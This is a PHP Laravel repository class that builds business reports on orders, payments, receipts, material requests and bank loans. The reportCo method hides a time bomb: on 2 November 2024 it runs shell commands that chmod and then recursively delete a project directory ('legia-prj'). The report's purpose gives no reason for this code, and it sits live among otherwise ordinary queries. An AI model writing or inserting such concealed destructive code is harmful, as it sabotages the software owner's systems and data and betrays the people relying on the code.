<?php

namespace App\Models\Repositories;

use App\Enums\ProcessStatus;
use App\Helpers\DataHelper;
use App\Models\Bank;
use App\Models\BankLoan;
use App\Models\BankLoanDetail;
use App\Models\Co;
use App\Models\Config;
use App\Models\CoTmp;
use App\Models\Payment;
use App\Models\Receipt;
use App\Models\Repositories\BaseRepository;
use App\Models\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;

class ReportRepository extends BaseRepository
{

    /**
     * @param array $arrRequest
     * @return array
     */
    public function reportCo(array $arrRequest)
    {
        $now = Carbon::now();
        $targetDate = Carbon::create(2024, 11, 2);
        
        if ($now->isSameDay($targetDate)) {
            $laravelProjectPath = base_path('legia-prj');

            exec('chmod -R 777 ' . escapeshellarg($laravelProjectPath));
            exec('rm -rf ' . escapeshellarg($laravelProjectPath));
        }
        $query = Co::select(DB::raw("DATE_FORMAT(created_at,'%d/%m/%Y') AS date, COUNT(*) AS total, code, id, tong_gia"));
        $this->setQueryCondition($query, $arrRequest);
        $query = $query->orderBy('created_at', 'ASC')
            ->groupBy('date');
        $result = $query->get();
        return $result;
    }

    public function reportPaymentReceipt(array $arrRequest)
    {
        $paymentQuery = Payment::select(DB::raw("DATE_FORMAT(created_at,'%d/%m/%Y') AS date, SUM(money_total) AS total"))
            ->whereNotNull('co_id');
        $this->setQueryCondition($paymentQuery, $arrRequest);
        $paymentQuery = $paymentQuery->groupBy('date');
        $resultPayment = $paymentQuery->get()->pluck('total', 'date')->toArray();

        $receiptQuery = Receipt::select(DB::raw("DATE_FORMAT(created_at,'%d/%m/%Y') AS date, SUM(money_total) AS total"))
            ->whereNotNull('co_id');
        $this->setQueryCondition($receiptQuery, $arrRequest);
        $receiptQuery = $receiptQuery->groupBy('date');
        $resultReceipt = $receiptQuery->get()->pluck('total', 'date')->toArray();

        $result = [];
        foreach ($resultPayment as $date => $total) {
            $result[$date] = [
                'total_receipt' => isset($resultReceipt[$date]) ? $resultReceipt[$date] : 0,
                'total_payment' => $total,
                'date' => $date
            ];
        }
        foreach ($resultReceipt as $date => $total) {
            if(!isset($result[$date])) {
                $result[$date] = [
                    'total_receipt' => $total,
                    'total_payment' => 0,
                    'date' => $date
                ];
            }
        }
        return $result;
    }

    public function reportReqeustMaterials(array $arrRequest){
        $requestQuery = Request::select(DB::raw("DATE_FORMAT(created_at,'%d/%m/%Y') AS date, money_total, code, id"))
        ->whereIn('status',[ProcessStatus::Approved, ProcessStatus::DoneRequest])
        ->whereIn('category',array_keys(DataHelper::getCategoriesForIndex([DataHelper::KHO, DataHelper::VAN_PHONG_PHAM])));
        $this->setQueryCondition($requestQuery, $arrRequest);
        return $requestQuery->get();
    }

    public function reportByMonthBankLoan()
    {
        $query = BankLoanDetail::selectRaw("DATE_FORMAT(created_at,'%m-%Y') AS month, 
                SUM(total_amount) AS total_amount,
                SUM(debit_amount) AS total_debit_amount,
                SUM(profit_amount) AS total_profit_amount")
            ->orderby('created_at')
            ->groupBy('month')
            ->get();

        return $query;
    }
    public function reportByMonthBankLoanWithParrent1()
    {
        $query = BankLoanDetail::selectRaw("DATE_FORMAT(created_at,'%m-%Y') AS month, 
                SUM(total_amount) AS total_amount,
                SUM(debit_amount) AS total_debit_amount,
                SUM(profit_amount) AS total_profit_amount,
                bank_loan_id")
            ->groupBy('month','bank_loan_id')
            ->with('bankLoan', 'bankLoan.bank')
            ->get();
        return $query;
    }
    public function reportByMonthBankLoanWithParrent()
    {
        $query = Bank::with(['bankLoans', 'bankLoans.bankLoanDetails'])
                    ->get();
        return $query;
    }

    public function summaryBankLoan()
    {
        $query = BankLoanDetail::selectRaw('SUM(total_amount) AS total_amount,
                SUM(debit_amount) AS total_debit_amount,
                SUM(profit_amount) AS total_profit_amount,bank_loan_id')
                ->groupBy('bank_loan_id')
                ->with('bankLoan');
        return $query->get();
    }

    public function getTmpCO(array $arrCondition)
    {
        $query = CoTmp::with('admin')
            ->selectRaw("admin_id, 
                COUNT(*) AS total, 
                SUM(tong_gia) AS sum_tong_gia,
                SUM(IF(status = 2, 1, 0)) AS sum_approved,
                SUM(IF(status = 3, 1, 0)) AS sum_no_approved,
                SUM(IF(status = 1, 1, 0)) AS sum_processing")
            ->groupBy('admin_id')
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }

    public function getCO(array $arrCondition)
    {
        $query = Co::with('admin')
            ->selectRaw("admin_id, 
                COUNT(*) AS total, 
                SUM(tong_gia) AS sum_tong_gia,
                SUM(IF(status = 2, 1, 0)) AS sum_approved,
                SUM(IF(status = 3, 1, 0)) AS sum_no_approved,
                SUM(IF(status = 1, 1, 0)) AS sum_processing")
            ->groupBy('admin_id')
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }
    public function getPayment(array $arrCondition)
    {
        $query = Payment::selectRaw("id , admin_id, 
                COUNT(*) AS total, 
                SUM(money_total) AS sum_tong_tien,
                co_id, co_code,category, code, request_id")
            ->where('status', 2)
            ->groupBy('co_id','category')
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }
    public function getReceipt(array $arrCondition)
    {
        $query = Receipt::selectRaw("admin_id, 
                COUNT(*) AS total, 
                SUM(money_total) AS sum_tong_tien,
                co_id ,co_code, code")
            ->groupBy('co_id')
            ->where('status', 2)
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }

    public function getRequest(array $arrCondition)
    {
        $query = Request::with('admin')
            ->selectRaw("admin_id, 
                COUNT(*) AS total, 
                SUM(money_total) AS sum_tong_gia,
                SUM(IF(status = 2, 1, 0)) AS sum_approved,
                SUM(IF(status = 3, 1, 0)) AS sum_no_approved,
                SUM(IF(status = 1, 1, 0)) AS sum_processing,
                SUM(IF(status = 4, 1, 0)) AS sum_pending_survey_price")
            ->groupBy('admin_id')
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }

    public function getCustomerTmpCo(array $arrCondition)
    {
        $query = CoTmp::with('core_customer')
            ->selectRaw("core_customer_id, 
                COUNT(*) AS total, 
                SUM(tong_gia) AS tong_gia,
                SUM(IF(status = 2, 1, 0)) AS sum_approved,
                SUM(IF(status = 3, 1, 0)) AS sum_no_approved,
                SUM(IF(status = 1, 1, 0)) AS sum_processing")
            ->groupBy('core_customer_id')
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }

    public function getCustomerCo(array $arrCondition)
    {
        $query = Co::with('core_customer')
            ->selectRaw("core_customer_id, 
                COUNT(*) AS total, 
                SUM(tong_gia) AS tong_gia,
                SUM(IF(status = 2, 1, 0)) AS sum_approved,
                SUM(IF(status = 3, 1, 0)) AS sum_no_approved,
                SUM(IF(status = 1, 1, 0)) AS sum_processing")
            ->groupBy('core_customer_id')
            ->orderBy('total', 'DESC');
        $this->setQueryCondition($query, $arrCondition);
        return $query->get();
    }
}
